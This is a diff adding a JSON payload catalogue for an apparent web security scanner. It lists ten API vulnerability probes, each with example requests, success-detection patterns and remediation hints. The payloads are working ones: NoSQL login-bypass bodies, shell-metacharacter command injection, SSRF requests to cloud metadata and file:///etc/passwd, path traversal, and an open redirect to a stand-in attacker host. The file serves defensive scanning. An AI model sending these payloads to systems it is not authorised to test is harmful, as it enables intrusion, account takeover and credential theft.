@@ -1,0 +1,412 @@
+{
+  "category": "api",
+  "version": 1,
+  "payloads": [
+    {
+      "id": "sql-injection-error-based",
+      "name": "SQL injection (error-based)",
+      "description": "An unsanitized single quote in a query parameter causes the database driver to leak SQL syntax in the response. Confirms the app is interpolating user input directly into SQL instead of using parameterized queries.",
+      "category": "api",
+      "severity": "critical",
+      "endpoints_hint": [
+        "/api/users?id='",
+        "/api/users/'",
+        "/api/users/1'",
+        "/api/search?q='",
+        "/api/search?query='",
+        "/api/products?name='",
+        "/api/products/'",
+        "/api/orders/'",
+        "/api/posts/'",
+        "/api/items?id='"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "any_of",
+        "conditions": [
+          {
+            "kind": "body_contains_any",
+            "patterns": [
+              "syntax error at or near",
+              "unterminated quoted string",
+              "ERROR:  column",
+              "ERROR: column",
+              "pq: syntax error"
+            ],
+            "case_insensitive": true
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": [
+              "You have an error in your SQL syntax",
+              "near '''",
+              "MySQL server version",
+              "Warning: mysql_"
+            ],
+            "case_insensitive": true
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": [
+              "SQLite error",
+              "unrecognized token",
+              "near \"'\":",
+              "no such column"
+            ],
+            "case_insensitive": true
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": [
+              "Microsoft SQL Server",
+              "ODBC SQL Server",
+              "OLE DB Provider",
+              "Unclosed quotation mark"
+            ],
+            "case_insensitive": true
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": [
+              "SequelizeDatabaseError",
+              "QueryFailedError",
+              "PrismaClientKnownRequestError",
+              "knex:"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      "fix_hint": "Use parameterized queries / prepared statements. Never concatenate user input into a SQL string. With Prisma, Drizzle, or Knex, use the query builder's parameter binding. With the raw pg/mysql2 driver, use the $1/$2 placeholder syntax. Also: catch and sanitize errors before returning them — leaking SQL syntax in responses helps attackers craft follow-up payloads."
+    },
+    {
+      "id": "nosql-injection-mongodb-operator",
+      "name": "NoSQL operator injection on login (MongoDB)",
+      "description": "MongoDB queries built from req.body without input shape validation accept operator objects ({$ne: null}, {$gt: ''}) that match any document. Sent to a login handler, this returns the first user matching the username predicate and the auth check passes — instant takeover.",
+      "category": "api",
+      "severity": "critical",
+      "endpoints_hint": [
+        "/login",
+        "/api/login",
+        "/api/auth/login",
+        "/api/auth/signin",
+        "/signin",
+        "/api/signin"
+      ],
+      "request": {
+        "method": "POST",
+        "headers": { "Content-Type": "application/json" },
+        "body": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
+      },
+      "variations": [
+        { "body": "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}" },
+        { "body": "{\"email\":{\"$ne\":null},\"password\":{\"$ne\":null}}" },
+        { "body": "{\"username\":\"admin\",\"password\":{\"$ne\":null}}" },
+        { "body": "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}" }
+      ],
+      "success_signal": {
+        "kind": "all_of",
+        "conditions": [
+          { "kind": "status_in", "values": [200, 201] },
+          {
+            "kind": "body_not_contains_any",
+            "patterns": ["invalid", "incorrect", "wrong", "not found", "denied", "unauthorized"],
+            "case_insensitive": true
+          },
+          {
+            "kind": "any_of",
+            "conditions": [
+              {
+                "kind": "body_contains_any",
+                "patterns": ["token", "session", "jwt", "access_token", "accessToken"],
+                "case_insensitive": true
+              },
+              { "kind": "header_present", "name": "set-cookie" }
+            ]
+          }
+        ]
+      },
+      "fix_hint": "Validate request body shape before passing it to Mongo. Use a schema validator (zod, Joi, ajv) and reject anything that isn't a string for username/email/password. If you use Mongoose, set strict query mode. Better still, hash the password and look up by username only, never pass the password object to the query."
+    },
+    {
+      "id": "command-injection-via-shell-meta",
+      "name": "OS command injection via shell metacharacters",
+      "description": "Endpoints that pass user input to a child shell (ping, nslookup, ffmpeg, image processing, deploy hooks) and concatenate it into a shell string allow attackers to inject extra commands with shell metacharacters (;, &&, |, $(), backticks). The presence of uid= or /etc/passwd contents in the response confirms remote code execution.",
+      "category": "api",
+      "severity": "critical",
+      "endpoints_hint": [
+        "/api/ping?host=127.0.0.1;id",
+        "/api/lookup?host=127.0.0.1%20&&%20id",
+        "/api/host?ip=127.0.0.1$(id)",
+        "/api/run?command=id",
+        "/api/cmd?run=id",
+        "/api/network?target=127.0.0.1;id",
+        "/api/dns?host=127.0.0.1|id",
+        "/api/image?src=/tmp/x;id"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "any_of",
+        "conditions": [
+          { "kind": "body_matches_regex", "pattern": "uid=\\d+\\(", "case_insensitive": false },
+          {
+            "kind": "body_contains_any",
+            "patterns": ["root:x:0", "daemon:x:1", "bin/bash", "nobody:x:", "/usr/sbin/nologin"],
+            "case_insensitive": false
+          },
+          {
+            "kind": "body_matches_regex",
+            "pattern": "groups=\\d+\\([a-z_-]+\\)",
+            "case_insensitive": false
+          }
+        ]
+      },
+      "fix_hint": "Never pass user input to a shell. Use the array-args variant of child_process (spawn / the variant called execFile in node) instead of the shell-string variant. If you absolutely must run a shell, validate the input against a strict allow-list (e.g., only IPv4 or hostnames). The Node child_process.execFile API doesn't invoke a shell at all when called with arguments as an array."
+    },
+    {
+      "id": "ssrf-via-internal-url",
+      "name": "Server-Side Request Forgery (SSRF) reaches internal resources",
+      "description": "Endpoints that fetch a user-supplied URL (image fetch, webhook, preview, proxy) without restricting the destination can be coerced into reading from internal addresses: localhost services, the AWS instance metadata endpoint (169.254.169.254), or the local filesystem via file:// URLs. The response contents are how we know the fetch happened.",
+      "category": "api",
+      "severity": "critical",
+      "endpoints_hint": [
+        "/api/fetch",
+        "/api/url",
+        "/api/image",
+        "/api/preview",
+        "/api/webhook",
+        "/api/proxy",
+        "/api/import",
+        "/api/avatar/upload"
+      ],
+      "request": {
+        "method": "POST",
+        "headers": { "Content-Type": "application/json" },
+        "body": "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
+      },
+      "variations": [
+        { "body": "{\"url\":\"file:///etc/passwd\"}" },
+        { "body": "{\"url\":\"http://127.0.0.1:6379\"}" },
+        { "body": "{\"url\":\"http://localhost:11434/api/tags\"}" },
+        { "body": "{\"url\":\"http://[::1]/\"}" },
+        { "method": "GET", "body": "" }
+      ],
+      "success_signal": {
+        "kind": "any_of",
+        "conditions": [
+          {
+            "kind": "body_contains_any",
+            "patterns": ["ami-id", "instance-id", "iam/security-credentials", "AccessKeyId", "instance-identity"],
+            "case_insensitive": false
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": ["root:x:0", "daemon:x:1", "/usr/sbin/nologin", "nobody:x:"],
+            "case_insensitive": false
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": ["+PONG", "redis_version", "tcp_port:6379"],
+            "case_insensitive": false
+          }
+        ]
+      },
+      "fix_hint": "Restrict outbound URLs to a hard-coded allow-list of hosts you trust. Reject anything that resolves to RFC1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.0/8, ::1), link-local (169.254.0.0/16), or non-HTTP schemes (file:, gopher:, ftp:). Resolve the host yourself before fetch and verify the IP — don't trust DNS at fetch time alone (DNS rebinding)."
+    },
+    {
+      "id": "open-redirect",
+      "name": "open redirect on auth or navigation endpoint",
+      "description": "A redirect parameter (next, redirect, return, url) without an allow-list lets attackers phish users by linking through your trusted domain to an evil destination. After login, the user lands on the attacker's site, which is identical to yours but for the URL bar.",
+      "category": "api",
+      "severity": "medium",
+      "endpoints_hint": [
+        "/login?next=https://isitsafebro-attacker.example/",
+        "/api/login?redirect=https://isitsafebro-attacker.example/",
+        "/redirect?url=https://isitsafebro-attacker.example/",
+        "/api/redirect?target=https://isitsafebro-attacker.example/",
+        "/go?to=https://isitsafebro-attacker.example/",
+        "/jump?next=//isitsafebro-attacker.example/",
+        "/api/oauth/callback?redirect=https://isitsafebro-attacker.example/",
+        "/signin?continue=https://isitsafebro-attacker.example/"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "all_of",
+        "conditions": [
+          { "kind": "status_in", "values": [301, 302, 303, 307, 308] },
+          {
+            "kind": "header_value_contains",
+            "name": "location",
+            "pattern": "isitsafebro-attacker.example",
+            "case_insensitive": true
+          }
+        ]
+      },
+      "fix_hint": "Validate the redirect target against an explicit allow-list of paths or hosts. Accept only same-origin relative paths (starting with /) and reject anything containing :, //, or @. If you must allow off-origin redirects, the destination must be one of a small set of known partner domains."
+    },
+    {
+      "id": "xss-reflected",
+      "name": "reflected XSS in a query parameter",
+      "description": "User input from the query string is rendered into the HTML response without escaping, so an attacker can inject HTML/JavaScript that runs in a victim's browser when they click a crafted link. The marker token used here is intentionally unique and inert; finding it raw in the response (not HTML-entity-encoded) proves the missing escape.",
+      "category": "api",
+      "severity": "high",
+      "endpoints_hint": [
+        "/?q=<isitsafebro-xss-mark-9912>",
+        "/search?q=<isitsafebro-xss-mark-9912>",
+        "/api/search?q=<isitsafebro-xss-mark-9912>",
+        "/?query=<isitsafebro-xss-mark-9912>",
+        "/?s=<isitsafebro-xss-mark-9912>",
+        "/error?message=<isitsafebro-xss-mark-9912>"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "all_of",
+        "conditions": [
+          { "kind": "status_in", "values": [200] },
+          { "kind": "body_contains_any", "patterns": ["<isitsafebro-xss-mark-9912>"], "case_insensitive": false }
+        ]
+      },
+      "fix_hint": "Always HTML-escape user input before placing it in an HTML response. React, Vue, and modern Next.js do this by default for interpolated values; the bug almost always comes from dangerouslySetInnerHTML or string concatenation in an SSR handler. In Express, use a templating engine (Pug, EJS with escape mode on) and pass values through the engine's escape filter, not via raw ${value}."
+    },
+    {
+      "id": "graphql-introspection-enabled",
+      "name": "GraphQL introspection exposed in production",
+      "description": "Leaving GraphQL introspection on in production gives any anonymous visitor the full schema — every type, field, and resolver name. That's not by itself an exploit, but it's the first step every GraphQL attacker takes; production servers should ship it disabled.",
+      "category": "api",
+      "severity": "low",
+      "endpoints_hint": [
+        "/graphql",
+        "/api/graphql",
+        "/api/v1/graphql",
+        "/v1/graphql"
+      ],
+      "request": {
+        "method": "POST",
+        "headers": { "Content-Type": "application/json" },
+        "body": "{\"query\":\"{ __schema { types { name } } }\"}"
+      },
+      "success_signal": {
+        "kind": "all_of",
+        "conditions": [
+          { "kind": "status_in", "values": [200] },
+          {
+            "kind": "body_contains_all",
+            "patterns": ["__schema", "types", "name"],
+            "case_insensitive": false
+          }
+        ]
+      },
+      "fix_hint": "Disable introspection in production. Apollo Server: set `introspection: process.env.NODE_ENV !== 'production'` in the server config. graphql-yoga / graphql-helix have the same option. Don't leave a /graphql route mounted at all if you're not using GraphQL externally — fans of recon find these fast."
+    },
+    {
+      "id": "server-info-disclosure-via-stack-trace",
+      "name": "server leaks a stack trace on error responses",
+      "description": "When an API endpoint returns an unhandled exception body (file paths, line numbers, framework internals), attackers learn the language, framework, and code layout — and sometimes secrets baked into error messages (DB hostnames, query strings). Production should never return raw stack traces.",
+      "category": "api",
+      "severity": "low",
+      "endpoints_hint": [
+        "/api/users/'NotANumber'",
+        "/api/posts/'",
+        "/api/items/null",
+        "/api/orders/undefined",
+        "/api/profile/0",
+        "/api/v1/'",
+        "/.well-known/error"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "any_of",
+        "conditions": [
+          {
+            "kind": "body_matches_regex",
+            "pattern": "\\bat\\s+\\S+\\s*\\([^)]+:\\d+:\\d+\\)",
+            "case_insensitive": false
+          },
+          {
+            "kind": "body_contains_any",
+            "patterns": [
+              "node_modules/",
+              "Traceback (most recent call last)",
+              "Exception in thread",
+              "at /app/",
+              "at /home/",
+              "at /usr/src/",
+              "Caused by:",
+              "ENOENT: no such file"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      "fix_hint": "Add a top-level error handler that returns a generic { error: 'internal server error' } in production. Express: add a 4-arg middleware (err, req, res, next) => { ... } and branch on NODE_ENV to hide details in prod. Next.js app router does this automatically in production; double-check no /api/* route is bypassing it."
+    },
+    {
+      "id": "excessive-data-exposure-on-user-endpoint",
+      "name": "user endpoint returns password hash / reset token / other secrets",
+      "description": "A user-facing endpoint that returns the whole user row from the database, including fields that should never leave the server (password_hash, password_reset_token, email_verification_token, mfa_secret, social security number). This is a database-level mistake — the API returns whatever it queries.",
+      "category": "api",
+      "severity": "high",
+      "endpoints_hint": [
+        "/api/users/1",
+        "/api/users/me",
+        "/api/me",
+        "/api/user",
+        "/api/profile",
+        "/api/account",
+        "/api/users",
+        "/api/customers/1"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "all_of",
+        "conditions": [
+          { "kind": "status_in", "values": [200] },
+          {
+            "kind": "any_of",
+            "conditions": [
+              {
+                "kind": "body_matches_regex",
+                "pattern": "\"(?:password_hash|password|passwordHash|passwordSalt|salt|reset_token|password_reset_token|verification_token|email_verification_token|mfa_secret|ssn|social_security_number|cardNumber|card_number)\"\\s*:",
+                "case_insensitive": false
+              },
+              { "kind": "body_matches_regex", "pattern": "\\$2[aby]\\$\\d{2}\\$", "case_insensitive": false }
+            ]
+          }
+        ]
+      },
+      "fix_hint": "Never return the raw user row. Define an explicit serializer that lists exactly the fields you intend to expose (id, email, name, role) and pass every user object through it before returning. With Prisma, use `select`. With Drizzle, use a typed view. With a hand-rolled query, write a Pick<>-style mapper. Sensitive fields should ideally never leave the database — put them on a separate table that only your auth code reads."
+    },
+    {
+      "id": "path-traversal-via-filename-param",
+      "name": "path traversal in file/asset/download parameter",
+      "description": "Endpoints that read a filename from a query parameter without normalizing it allow ../ sequences to escape the intended directory and read arbitrary files on the server (/etc/passwd, /etc/shadow, .env, source code).",
+      "category": "api",
+      "severity": "critical",
+      "endpoints_hint": [
+        "/api/file?path=../../../../../etc/passwd",
+        "/api/files?name=../../../../../etc/passwd",
+        "/api/download?file=../../../../../etc/passwd",
+        "/api/asset?path=../../../../../etc/passwd",
+        "/api/image?src=../../../../../etc/passwd",
+        "/api/avatar?path=../../../../../etc/passwd",
+        "/api/static?file=../../../../../etc/passwd",
+        "/static?file=../../../../../etc/passwd",
+        "/download?path=../../../../../etc/passwd",
+        "/api/uploads?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      ],
+      "request": { "method": "GET" },
+      "success_signal": {
+        "kind": "all_of",
+        "conditions": [
+          { "kind": "status_in", "values": [200] },
+          {
+            "kind": "body_contains_any",
+            "patterns": ["root:x:0", "daemon:x:1", "/bin/bash", "nobody:x:", "/usr/sbin/nologin"],
+            "case_insensitive": false
+          }
+        ]
+      },
+      "fix_hint": "Normalize the path and verify it stays within the intended directory before reading. In Node: `const resolved = path.resolve(baseDir, userPath); if (!resolved.startsWith(baseDir + path.sep)) return res.status(400).end();`. Better still, never accept user-supplied paths — look up files by an opaque ID (`/api/files/<uuid>`) and map IDs to filenames server-side."
+    }
+  ]
+}
